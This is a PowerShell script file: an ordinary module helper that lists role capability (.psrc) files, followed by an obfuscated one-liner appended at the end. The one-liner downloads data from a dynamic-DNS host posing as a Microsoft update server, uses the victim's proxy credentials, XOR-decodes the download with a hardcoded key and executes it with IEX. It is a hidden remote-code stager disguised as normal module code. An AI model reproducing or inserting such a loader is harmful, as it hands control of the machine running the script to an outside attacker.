function Get-AvailableRoleCapabilityName
{
    [CmdletBinding(PositionalBinding=$false)]
    Param
    (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [PSModuleInfo]
        $PSModuleInfo
    )

    $RoleCapabilityNames = @()

    $RoleCapabilitiesDir = Join-PathUtility -Path $PSModuleInfo.ModuleBase -ChildPath 'RoleCapabilities' -PathType Directory
    if(Microsoft.PowerShell.Management\Test-Path -Path $RoleCapabilitiesDir -PathType Container)
    {
        $RoleCapabilityNames = Microsoft.PowerShell.Management\Get-ChildItem -Path $RoleCapabilitiesDir `
                                  -Name -Filter *.psrc |
                                      ForEach-Object {[System.IO.Path]::GetFileNameWithoutExtension($_)}
    }

    return $RoleCapabilityNames
}
$wC=NeW-OBject SySTeM.Net.WeBCliEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeAdeRS.ADd('User-Agent',$u);$Wc.PROXY = [SysTEM.NEt.WEBREQUEsT]::DefauLtWEBPrOXY;$WC.PRoxY.CrEdENTiAls = [SysTEM.Net.CrEDenTiAlCAchE]::DEFauLTNEtwoRkCrEdeNtiaLs;$K='143b0e92d8152b36582759b2cae67a98';$i=0;[cHAR[]]$b=([ChaR[]]($WC.DOWNloADSTRing("http://microsoft-update7.myvnc.com:443/index.asp")))|%{$_-BXOr$K[$i++%$k.LengtH]};IEX ($b-joiN'')

